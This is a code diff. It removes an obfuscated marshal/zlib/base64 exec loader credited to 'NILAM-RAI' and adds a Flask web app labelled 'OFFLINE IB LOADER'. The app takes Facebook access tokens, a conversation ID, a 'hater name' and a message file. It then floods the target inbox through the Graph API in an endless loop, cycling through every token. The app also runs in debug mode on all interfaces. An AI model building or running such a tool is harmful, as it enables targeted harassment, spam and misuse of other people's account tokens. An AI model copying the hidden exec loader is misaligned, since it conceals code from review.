@@ -1,6 +1,204 @@
-#ENCODED BY : NILAM-RAI  
-#ENCRYPTION : Py3 MARSHAL+ZLIB+B64
-#GITHUB : https://github.com/NILAM-RAI
-#----------------------------------------------
-import marshal, base64, zlib
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
+from flask import Flask, request, render_template_string
+import requests
+from threading import Thread, Event
+import time
+import random
+import string
+ 
+app = Flask(__name__)
+app.debug = True
+ 
+headers = {
+    'Connection': 'keep-alive',
+    'Cache-Control': 'max-age=0',
+    'Upgrade-Insecure-Requests': '1',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
+    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+    'Accept-Encoding': 'gzip, deflate',
+    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+    'referer': 'www.google.com'
+}
+ 
+stop_events = {}
+threads = {}
+ 
+def send_messages(access_tokens, thread_id, mn, time_interval, messages, task_id):
+    stop_event = stop_events[task_id]
+    while not stop_event.is_set():
+        for message1 in messages:
+            if stop_event.is_set():
+                break
+            for access_token in access_tokens:
+                api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
+                message = str(mn) + ' ' + message1
+                parameters = {'access_token': access_token, 'message': message}
+                response = requests.post(api_url, data=parameters, headers=headers)
+                if response.status_code == 200:
+                    print(f"Message Sent Successfully From token {access_token}: {message}")
+                else:
+                    print(f"Message Sent Failed From token {access_token}: {message}")
+                time.sleep(time_interval)
+ 
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+    if request.method == 'POST':
+        token_option = request.form.get('tokenOption')
+        
+        if token_option == 'single':
+            access_tokens = [request.form.get('singleToken')]
+        else:
+            token_file = request.files['tokenFile']
+            access_tokens = token_file.read().decode().strip().splitlines()
+ 
+        thread_id = request.form.get('threadId')
+        mn = request.form.get('kidx')
+        time_interval = int(request.form.get('time'))
+ 
+        txt_file = request.files['txtFile']
+        messages = txt_file.read().decode().splitlines()
+ 
+        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
+ 
+        stop_events[task_id] = Event()
+        thread = Thread(target=send_messages, args=(access_tokens, thread_id, mn, time_interval, messages, task_id))
+        threads[task_id] = thread
+        thread.start()
+ 
+        return f'Task started with ID: {task_id}'
+ 
+    return render_template_string('''
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CREATED BY NILAM RAI</title>
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
+  <style>
+    /* CSS for styling elements */
+    label { color: white; }
+    .file { height: 30px; }
+    body {
+      background-image: url('https://i.ibb.co/HKJ55cM/673580e3bf8e53-24509014-Processed-1.jpg');
+      background-size: cover;
+      background-repeat: no-repeat;
+      color: white;
+    }
+    .container {
+      max-width: 350px;
+      height: auto;
+      border-radius: 20px;
+      padding: 20px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 0 15px white;
+      border: none;
+      resize: none;
+    }
+    .form-control {
+      outline: 1px red;
+      border: 1px double white;
+      background: transparent;
+      width: 100%;
+      height: 40px;
+      padding: 7px;
+      margin-bottom: 20px;
+      border-radius: 10px;
+      color: none;
+    }
+    .header { text-align: center; padding-bottom: 20px; }
+    .btn-submit { width: 100%; margin-top: 10px; }
+    .footer { text-align: center; margin-top: 20px; color: #888; }
+    .whatsapp-link {
+      display: inline-block;
+      color: #25d366;
+      text-decoration: none;
+      margin-top: 10px;
+    }
+    .whatsapp-link i { margin-right: 5px; }
+  </style>
+</head>
+<body>
+  <header class="header mt-4">
+    <h1 class="mt-3">OWNER :: NILAM RAI</h1>
+  </header>
+  <div class="container text-center">
+    <form method="post" enctype="multipart/form-data">
+      <div class="mb-3">
+        <label for="tokenOption" class="form-label">Select Token Option</label>
+        <select class="form-control" id="tokenOption" name="tokenOption" onchange="toggleTokenInput()" required>
+          <option value="single">Single Token</option>
+          <option value="multiple">Token File</option>
+        </select>
+      </div>
+      <div class="mb-3" id="singleTokenInput">
+        <label for="singleToken" class="form-label">Enter Single Token</label>
+        <input type="text" class="form-control" id="singleToken" name="singleToken">
+      </div>
+      <div class="mb-3" id="tokenFileInput" style="display: none;">
+        <label for="tokenFile" class="form-label">Choose Token File</label>
+        <input type="file" class="form-control" id="tokenFile" name="tokenFile">
+      </div>
+      <div class="mb-3">
+        <label for="threadId" class="form-label">Enter Inbox/convo uid</label>
+        <input type="text" class="form-control" id="threadId" name="threadId" required>
+      </div>
+      <div class="mb-3">
+        <label for="kidx" class="form-label">Enter Your Hater Name</label>
+        <input type="text" class="form-control" id="kidx" name="kidx" required>
+      </div>
+      <div class="mb-3">
+        <label for="time" class="form-label">Enter Time (seconds)</label>
+        <input type="number" class="form-control" id="time" name="time" required>
+      </div>
+      <div class="mb-3">
+        <label for="txtFile" class="form-label">Choose Your Np File</label>
+        <input type="file" class="form-control" id="txtFile" name="txtFile" required>
+      </div>
+      <button type="submit" class="btn btn-primary btn-submit">Run</button>
+    </form>
+    <form method="post" action="/stop">
+      <div class="mb-3">
+        <label for="taskId" class="form-label">Enter Task ID to Stop</label>
+        <input type="text" class="form-control" id="taskId" name="taskId" required>
+      </div>
+      <button type="submit" class="btn btn-danger btn-submit mt-3">Stop</button>
+    </form>
+  </div>
+  <footer class="footer">
+    <p>2024 OFFLINE IB LOADER</p>
+    <p>REMADE BY NILAM RAI</a></p>
+    <div class="mb-3">
+      <a href="https://www.facebook.com/profile.php?id=61566744287237" class="whatsapp-link">
+        <i class="fab fa-facebook"></i> Chat on Facebook 
+      </a>
+    </div>
+  </footer>
+  <script>
+    function toggleTokenInput() {
+      var tokenOption = document.getElementById('tokenOption').value;
+      if (tokenOption == 'single') {
+        document.getElementById('singleTokenInput').style.display = 'block';
+        document.getElementById('tokenFileInput').style.display = 'none';
+      } else {
+        document.getElementById('singleTokenInput').style.display = 'none';
+        document.getElementById('tokenFileInput').style.display = 'block';
+      }
+    }
+  </script>
+</body>
+</html>
+''')
+ 
+@app.route('/stop', methods=['POST'])
+def stop_task():
+    task_id = request.form.get('taskId')
+    if task_id in stop_events:
+        stop_events[task_id].set()
+        return f'Task with ID {task_id} has been stopped.'
+    else:
+        return f'No task found with ID {task_id}.'
+ 
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
